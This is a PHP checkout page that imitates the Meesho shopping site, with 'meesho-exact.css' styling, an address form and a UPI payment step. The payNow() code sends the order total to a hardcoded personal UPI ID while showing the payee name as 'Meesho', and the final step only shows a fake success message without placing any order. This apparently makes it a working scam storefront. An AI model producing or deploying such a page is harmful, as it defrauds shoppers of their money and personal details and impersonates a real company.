<?php
session_start();
if (!isset($_SESSION['cart'])) {
    $_SESSION['cart'] = [];
}

$step = isset($_GET['step']) ? $_GET['step'] : 'address';
$validSteps = ['address', 'payment', 'summary'];
if (!in_array($step, $validSteps)) {
    $step = 'address';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout - Meesho</title>
    <link rel="stylesheet" href="assets/css/meesho-exact.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="header-content">
            <div class="header-left">
                <button class="back-btn" onclick="goBack()">
                    <i class="fas fa-arrow-left"></i>
                </button>
                <span class="page-title" id="pageTitle">ADD DELIVERY ADDRESS</span>
            </div>
        </div>
    </header>

    <!-- Progress Steps -->
    <div class="progress-steps">
        <div class="step completed">
            <div class="step-number"><i class="fas fa-check"></i></div>
            <span>Cart</span>
        </div>
        <div class="step-line completed"></div>
        <div class="step <?php echo $step === 'address' ? 'active' : ($step === 'payment' || $step === 'summary' ? 'completed' : ''); ?>">
            <div class="step-number"><?php echo $step === 'address' ? '2' : '<i class="fas fa-check"></i>'; ?></div>
            <span>Address</span>
        </div>
        <div class="step-line <?php echo $step === 'payment' || $step === 'summary' ? 'completed' : ''; ?>"></div>
        <div class="step <?php echo $step === 'payment' ? 'active' : ($step === 'summary' ? 'completed' : ''); ?>">
            <div class="step-number"><?php echo $step === 'payment' ? '3' : ($step === 'summary' ? '<i class="fas fa-check"></i>' : '3'); ?></div>
            <span>Payment</span>
        </div>
        <div class="step-line <?php echo $step === 'summary' ? 'completed' : ''; ?>"></div>
        <div class="step <?php echo $step === 'summary' ? 'active' : ''; ?>">
            <div class="step-number">4</div>
            <span>Summary</span>
        </div>
    </div>

    <!-- Checkout Content -->
    <div class="checkout-container">
        <?php if ($step === 'address'): ?>
            <!-- Address Form -->
            <div class="address-section">
                <div class="section-header">
                    <i class="fas fa-map-marker-alt"></i>
                    <h3>Address</h3>
                </div>
                
                <form id="addressForm" class="address-form">
                    <div class="form-group">
                        <label>Full Name</label>
                        <input type="text" id="fullName" placeholder="Lunea Delgado" required>
                    </div>
                    
                    <div class="form-group">
                        <label>Mobile number</label>
                        <input type="tel" id="mobile" placeholder="480" required>
                    </div>
                    
                    <div class="form-group">
                        <label>Pincode</label>
                        <input type="text" id="pincode" placeholder="Natus non rerum volu" required>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label>City</label>
                            <input type="text" id="city" placeholder="Optio quo illo nost" required>
                        </div>
                        <div class="form-group">
                            <label>State</label>
                            <select id="state" required>
                                <option value="">Select State</option>
                                <option value="Karnataka" selected>Karnataka</option>
                            </select>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>House No., Building Name</label>
                        <input type="text" id="houseNo" placeholder="Quis id est et sed" required>
                    </div>
                    
                    <div class="form-group">
                        <label>Road name, Area, Colony</label>
                        <input type="text" id="area" placeholder="Quis laboris ullam q" required>
                    </div>
                </form>
            </div>
        <?php elseif ($step === 'payment'): ?>
            <!-- Payment Section -->
            <div class="payment-section">
                <div class="section-header">
                    <h3>Select Payment Method</h3>
                    <div class="safe-payments">
                        <i class="fas fa-shield-alt"></i>
                        <span>100% SAFE PAYMENTS</span>
                    </div>
                </div>

                <div class="payment-offer">
                    <i class="fas fa-tag"></i>
                    <span>Pay online & get EXTRA ₹33 off</span>
                </div>

                <div class="payment-methods">
                    <h4>PAY ONLINE</h4>
                    
                    <div class="payment-method">
                        <div class="method-header" onclick="togglePaymentDetails()">
                            <span>UPI(GPay/PhonePe/Paytm)</span>
                            <i class="fas fa-chevron-down"></i>
                        </div>
                    </div>

                    <div class="upi-options">
                        <div class="upi-option" onclick="selectUPI('gpay')">
                            <input type="radio" name="upi" id="gpay" checked>
                            <label for="gpay">
                                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%234285f4'%3E%3Cpath d='M12 2L2 7v10c0 5.55 3.84 9.95 9 11 5.16-1.05 9-5.45 9-11V7l-10-5z'/%3E%3C/svg%3E" alt="GPay">
                                <span>G Pay</span>
                            </label>
                        </div>

                        <div class="upi-option" onclick="selectUPI('phonepe')">
                            <input type="radio" name="upi" id="phonepe">
                            <label for="phonepe">
                                <i class="fab fa-phonepe" style="color: #5f259f;"></i>
                                <span>PhonePe</span>
                            </label>
                        </div>

                        <div class="upi-option" onclick="selectUPI('paytm')">
                            <input type="radio" name="upi" id="paytm">
                            <label for="paytm">
                                <i class="fab fa-cc-visa" style="color: #00BAF2;"></i>
                                <span>Paytm</span>
                            </label>
                        </div>

                        <div class="upi-option" onclick="selectUPI('whatsapp')">
                            <input type="radio" name="upi" id="whatsapp">
                            <label for="whatsapp">
                                <i class="fab fa-whatsapp" style="color: #25D366;"></i>
                                <span>WhatsappPay</span>
                            </label>
                        </div>
                    </div>
                </div>

                <div class="order-summary">
                    <div class="summary-row">
                        <span>Shipping:</span>
                        <span class="free">FREE</span>
                    </div>
                    <div class="summary-row">
                        <span>Total Product Price:</span>
                        <span id="totalPrice">₹98.00</span>
                    </div>
                    <div class="summary-row total">
                        <span>Order Total:</span>
                        <span id="orderTotal">₹98.00</span>
                    </div>
                </div>
            </div>
        <?php else: ?>
            <!-- Summary Section -->
            <div class="summary-section">
                <h3>Order Summary</h3>
                <div class="order-details" id="orderDetails">
                    <!-- Order details will be loaded here -->
                </div>
            </div>
        <?php endif; ?>
    </div>

    <!-- Action Button -->
    <div class="checkout-action">
        <div class="price-display">
            <span id="bottomTotal">₹98.00</span>
            <span class="price-details">VIEW PRICE DETAILS</span>
        </div>
        <?php if ($step === 'address'): ?>
            <button class="action-btn" onclick="saveAddressAndContinue()">Save Address and Continue</button>
        <?php elseif ($step === 'payment'): ?>
            <button class="action-btn" onclick="payNow()">PayNow</button>
        <?php else: ?>
            <button class="action-btn" onclick="placeOrder()">Place Order</button>
        <?php endif; ?>
    </div>

    <script src="assets/js/main.js"></script>
    <script src="assets/js/checkout.js"></script>
    <script>
        let selectedUPIMethod = 'gpay';
        const currentStep = '<?php echo $step; ?>';

        // Update page title based on step
        const titles = {
            'address': 'ADD DELIVERY ADDRESS',
            'payment': 'PAYMENT',
            'summary': 'ORDER SUMMARY'
        };
        document.getElementById('pageTitle').textContent = titles[currentStep];

        // Load states if on address step
        if (currentStep === 'address') {
            loadStates();
        }

        async function loadStates() {
            try {
                const response = await fetch('data/states.json');
                const states = await response.json();
                const stateSelect = document.getElementById('state');
                
                states.forEach(state => {
                    const option = document.createElement('option');
                    option.value = state;
                    option.textContent = state;
                    if (state === 'Karnataka') {
                        option.selected = true;
                    }
                    stateSelect.appendChild(option);
                });
            } catch (error) {
                console.error('Error loading states:', error);
            }
        }

        function saveAddressAndContinue() {
            const form = document.getElementById('addressForm');
            if (form.checkValidity()) {
                // Save address data
                const addressData = {
                    fullName: document.getElementById('fullName').value,
                    mobile: document.getElementById('mobile').value,
                    pincode: document.getElementById('pincode').value,
                    city: document.getElementById('city').value,
                    state: document.getElementById('state').value,
                    houseNo: document.getElementById('houseNo').value,
                    area: document.getElementById('area').value
                };
                
                localStorage.setItem('deliveryAddress', JSON.stringify(addressData));
                window.location.href = 'checkout.php?step=payment';
            } else {
                form.reportValidity();
            }
        }

        function selectUPI(method) {
            selectedUPIMethod = method;
            document.querySelectorAll('input[name="upi"]').forEach(radio => {
                radio.checked = radio.id === method;
            });
        }

        function togglePaymentDetails() {
            // Toggle payment method details
        }

        function payNow() {
            // UPI Deep Link Integration
            const upiId = 'rekhadevi573710.rzp@icici';
            const amount = document.getElementById('orderTotal').textContent.replace('₹', '');
            const note = 'Meesho Order Payment';
            
            let upiUrl = '';
            
            switch (selectedUPIMethod) {
                case 'gpay':
                    upiUrl = `tez://upi/pay?pa=${upiId}&pn=Meesho&am=${amount}&cu=INR&tn=${note}`;
                    break;
                case 'phonepe':
                    upiUrl = `phonepe://pay?pa=${upiId}&pn=Meesho&am=${amount}&cu=INR&tn=${note}`;
                    break;
                case 'paytm':
                    upiUrl = `paytmmp://pay?pa=${upiId}&pn=Meesho&am=${amount}&cu=INR&tn=${note}`;
                    break;
                case 'whatsapp':
                    upiUrl = `whatsapp://pay?pa=${upiId}&pn=Meesho&am=${amount}&cu=INR&tn=${note}`;
                    break;
                default:
                    upiUrl = `upi://pay?pa=${upiId}&pn=Meesho&am=${amount}&cu=INR&tn=${note}`;
            }
            
            // Try to open UPI app
            window.location.href = upiUrl;
            
            // Fallback: redirect to summary after 3 seconds
            setTimeout(() => {
                window.location.href = 'checkout.php?step=summary';
            }, 3000);
        }

        function placeOrder() {
            // Process order
            alert('Order placed successfully!');
            window.location.href = 'index.php';
        }

        function goBack() {
            if (currentStep === 'address') {
                window.location.href = 'cart.php';
            } else if (currentStep === 'payment') {
                window.location.href = 'checkout.php?step=address';
            } else {
                window.location.href = 'checkout.php?step=payment';
            }
        }

        // Update cart count
        updateCartCount();
    </script>
</body>
</html>
